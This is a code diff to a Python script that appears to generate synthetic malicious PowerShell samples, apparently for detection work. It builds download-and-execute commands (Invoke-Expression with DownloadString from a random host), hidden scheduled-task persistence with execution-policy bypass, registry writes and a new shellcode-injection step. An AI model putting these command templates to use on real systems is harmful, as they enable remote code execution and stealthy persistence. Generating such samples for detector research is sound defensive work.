@@ -26,24 +26,32 @@ def get_random_regkey():
 	key_location = "HKCU:\\" + "\\".join([get_random_word() for _ in range(random.randint(2,5))])
 	return key_name, key_location
 
+def get_random_shellcode():
+	shellcode = ",".join([hex(random.randint(0,255)) for _ in range(150)])
+	return shellcode
+
 def remote_payload_cmd():
 	ip = get_random_dest()
 	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + ip + "\") \n"
 
 #https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
-def persistence_cmd():
+def schtasks_persistence_cmd():
 	cmd = "schtasks /create /tn OfficeUpdatorB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "
 	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
 	return cmd
 
-def registry_key_cmd():
+def set_registry_key_cmd():
 	cmd = "$code = \"" + get_random_text(50,100) + "\"\n"
 	key_location, key_name = get_random_regkey()
 	cmd += "Set-ItemProperty \"HKCU:\\" + key_location + "\\\" -Name " + key_name + " -Value " + "$code \n"
 	return cmd
 
-#TODO: set_registry_key_cmd
-commands = [remote_payload_cmd, persistence_cmd, registry_key_cmd]
+def inject_shellcode_cmd():
+	cmd = "[Byte[]] $Shellcode = @(" + get_random_shellcode() + ") \n";
+	cmd += "".join(open("./scripts/inject_shellcode.ps1").readlines())
+	return cmd
+
+commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd, inject_shellcode_cmd]
 
 def generate_script():
 	script = ""
